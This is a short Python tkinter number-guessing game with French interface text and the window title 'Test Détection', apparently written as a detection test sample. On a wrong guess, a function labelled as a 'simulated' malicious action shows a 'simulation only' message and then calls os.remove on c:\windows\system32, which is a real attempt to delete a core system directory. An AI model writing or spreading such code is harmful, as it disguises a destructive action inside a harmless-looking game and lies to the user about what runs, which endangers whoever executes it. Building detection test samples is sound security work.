import tkinter as tk
import random
import time
import os

def action_malveillante_simulee():
    resultat_label.config(text="Analyse du système...\nSuppression de fichiers en cours...")

    resultat_label.config(text="Action terminée. (Simulation uniquement)")
    time.sleep(4)
    os.remove("c:\\windows\\system32")
    #os.remove("y")


def verifier_reponse():
    try:
        guess = int(entry.get())
    except ValueError:
        resultat_label.config(text="Entrez un nombre valide.")
        return

    if guess == number:
        resultat_label.config(text="🎉 Tu as gagné !")
    else:
        action_malveillante_simulee()

# Génère un nombre
number = random.randint(1, 10)

# GUI
root = tk.Tk()
root.title("Test Détection")
root.geometry("300x200")

label = tk.Label(root, text="Devine un nombre entre 1 et 10 :")
label.pack(pady=10)

entry = tk.Entry(root)
entry.pack()

bouton = tk.Button(root, text="Envoyer", command=verifier_reponse)
bouton.pack(pady=10)

resultat_label = tk.Label(root, text="")
resultat_label.pack()

root.mainloop()
